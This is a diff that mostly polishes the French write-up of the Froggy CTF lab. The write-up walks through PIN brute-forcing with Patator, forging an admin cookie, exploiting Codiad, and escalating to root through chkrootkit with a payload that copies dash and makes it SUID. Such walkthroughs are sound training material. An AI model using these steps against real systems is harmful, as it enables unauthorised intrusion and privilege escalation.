@@ -8,7 +8,7 @@ Froggie jumped all over the stage that day
 
 *Froggy* est un CTF basé Linux proposé sur la plateforme *Wizard Labs*.  
 
-Via un buster avec une liste assez large de paths potentiels on trouve différents dossiers mais surtout une zone membre :  
+Via un buster avec une liste assez large de paths potentiels, on trouve différents dossiers, mais surtout une zone membre :  
 
 ```
 /images (Status: 301)
@@ -18,7 +18,7 @@ Via un buster avec une liste assez large de paths potentiels on trouve différen
 /memberarea (Status: 301)
 ```
 
-dans cette zone on peut trouver des pages PHP mais elles nécessitent une authentification :  
+Dans cette zone, on peut trouver des pages PHP, mais elles nécessitent une authentification :  
 
 ```
 /index.php (Status: 200)
@@ -35,9 +35,9 @@ dans cette zone on peut trouver des pages PHP mais elles nécessitent une authen
 /remove.php (Status: 200)
 ```
 
-Le script *forgot.php* correspond évidemment à un script de récupération de mot de passe. Il est tout de même assez inhabituel puisqu'il ne demande qu'un PIN.  
+Le script `forgot.php` correspond évidemment à un script de récupération de mot de passe. Il est tout de même assez inhabituel puisqu'il ne demande qu'un PIN.  
 
-Partant du principe qu'un PIN est généralement numérique on peut utiliser Patator pour trouver les PIN qui ne sont pas invalides :  
+Partant du principe qu'un PIN est généralement numérique on peut utiliser _Patator_ pour trouver les PINs qui ne sont pas invalides :  
 
 ```bash
 patator http_fuzz url='http://10.1.1.56/memberarea/forgot.php' method=POST body='forgotpass=Check&secretpin=RANGE0' 0=int:0-10000 -x ignore:fgrep='Sercet pin not matched'
@@ -45,17 +45,15 @@ patator http_fuzz url='http://10.1.1.56/memberarea/forgot.php' method=POST body=
 
 NB: la typo fait partie du challenge.  
 
-Avec un PIN de 0 on obtient un message différent : *Please enter your secret pin to view your password.*  
+Avec un PIN de 0 on obtient un message différent : `Please enter your secret pin to view your password.`  
 
-Hmmm étrange mais pas vraiment utile :-/   
+Hmmm étrange, mais pas vraiment utile :-/   
 
-Puisque le site le permet j'ai créé un compte dans cette zone membre et une fois connecté on peut clairement voir un cookie nommé *membersession* qui contient le base64 correspondant au compte que je viens de créer (*devloop*).  
+Puisque le site le permet j'ai créé un compte dans cette zone membre et une fois connecté on peut clairement voir un cookie nommé `membersession` qui contient le base64 correspondant au compte que je viens de créer (`devloop`).  
 
-Il suffit d'éditer le cookie pour y mettre le base64 de *admin* puis on retourne sur le dashboard qui nous livre ses secrets :  
+Il suffit d'éditer le cookie pour y mettre le base64 de `admin` puis on retourne sur le dashboard qui nous livre ses secrets :  
 
 > Welcome admin  
-> 
->   
 > 
 > Your Notes : Need to beautify our gallery using '83VbbDGjefTnM9wQ' as Password
 
@@ -64,11 +62,11 @@ Codiadwnage
 
 Où utiliser ces identifiants ?  
 
-Toujours sous */memberarea* on trouve un dossier nommé *editor* qui est un IDE web baptisé [Codiad](http://codiad.com/).  
+Toujours sous `/memberarea` on trouve un dossier nommé `editor` qui est un IDE web baptisé [Codiad](http://codiad.com/).  
 
-Pas grand chose d'intéressant à y voir une fois connecté, toutefois ce soft semble vulnérable :  
+Pas grand-chose d'intéressant à y voir une fois connecté, toutefois ce soft semble vulnérable :  
 
-```
+```console
 $ searchsploit codiad
 ----------------------------------------- ----------------------------------------
  Exploit Title                           |  Path
@@ -93,11 +91,11 @@ sysadm:x:1001:1001:,,,:/home/sysadm:/bin/bash
 ahmed:x:1002:1002:,,,:/home/ahmed:/bin/bash
 ```
 
-La clé privée SSH de *ahmed* est récupérable et nous permet d'obtenir notre shell ainsi que le premier flag :)  
+La clé privée SSH de `ahmed` est récupérable et nous permet d'obtenir notre shell ainsi que le premier flag :)  
 
 On reçoit aussi une notification de réception d'un email :  
 
-```
+```console
 You have mail.
 Last login: Sat Feb 23 10:27:50 2019 from 192.168.0.30
 ahmed@froggy:~$ mail
@@ -125,13 +123,13 @@ Your Lovely SysAdmin  !!
 Cuisses de grenouilles
 ----------------------
 
-Au début je me suis dirigé vers l'idée d'un script custom à exploiter, j'ai donc fouillé un droite à gauche.  
+Au début, je me suis dirigé vers l'idée d'un script custom à exploiter, j'ai donc fouillé à droite à gauche.  
 
-L'utilisateur *sysadm* ne dispose d'aucun fichier vraiment intéressant.  
+L'utilisateur `sysadm` ne dispose d'aucun fichier vraiment intéressant.  
 
 Après avoir récupéré les identifiants SQL j'ai trouvé le mot de passe admin de la zone membre ainsi que les PINs, ce qui explique le message de tout à l'heure.  
 
-```
+```console
 $ mysql -u membership -p member
 Enter password:
 Reading table information for completion of table and column names
@@ -164,9 +162,9 @@ MariaDB [member]> select * from pdo;
 3 rows in set (0.26 sec)
 ```
 
-Je suis alors parti sur l'idée que *chkrootkit* soit exécuté via un *crontab* puisque je savais qu'une faille existait pour ce logiciel (forcément ça en a fait rigoler quelques-uns).  
+Je suis alors parti sur l'idée que `chkrootkit` soit exécuté via un `crontab` puisque je savais qu'une faille existait pour ce logiciel (forcément ça en a fait rigoler quelques-uns).  
 
-Le binaire est bien présent sur le système mais est-il exécuté ? J'ai eu recours une nouvelle fois à mon script de surveillance des process ([voir CTF Homeless]({% link _posts/2018-02-23-Solution-du-CTF-Homeless-de-VulnHub.md %})) :  
+Le binaire est bien présent sur le système, mais est-il exécuté ? J'ai eu recours une nouvelle fois à mon script de surveillance des process ([voir CTF Homeless]({% link _posts/2018-02-23-Solution-du-CTF-Homeless-de-VulnHub.md %})) :  
 
 ```bash
 23961 root /usr/sbin/CRON -f
@@ -194,9 +192,9 @@ Le binaire est bien présent sur le système mais est-il exécuté ? J'ai eu rec
 25027 root wc -l
 ```
 
-L'exploit présent [sur exploit-db](https://www.exploit-db.com/exploits/33899) indique que chkrootkit va exécuter les scripts présents dans la variable *SLAPPER\_FILES*.  
+L'exploit présent [sur exploit-db](https://www.exploit-db.com/exploits/33899) indique que `chkrootkit` va exécuter les scripts présents dans la variable `SLAPPER_FILES`.  
 
-L'exploit donnait un exemple avec le script */tmp/update* donc au début je ne suis pas allé plus loin mais voyant que rien ne s'exécutait j'ai regardé le code (chkrootkit est écrit en bash) et la liste variable était différente :  
+L'exploit donnait un exemple avec le script `/tmp/update` donc au début je ne suis pas allé plus loin, mais voyant que rien ne s'exécutait j'ai regardé le code (`chkrootkit` est écrit en bash) et la liste variable était différente :  
 
 ```bash
 SLAPPER_FILES="${ROOTDIR}dev/shm/slapper"
@@ -210,7 +208,7 @@ cp /bin/dash /tmp/devloop_was_here
 chmod 4755 /tmp/devloop_was_here
 ```
 
-Cette fois notre script est bien exécuté:  
+Cette fois notre script est bien exécuté :  
 
 ```bash
 2890 root /bin/sh /usr/bin/chkrootkit
@@ -231,7 +229,7 @@ Cette fois notre script est bien exécuté:
 3133 root [chmod]
 ```
 
-```
+```console
 $ ./devloop_was_here
 # cd /root
 # ls
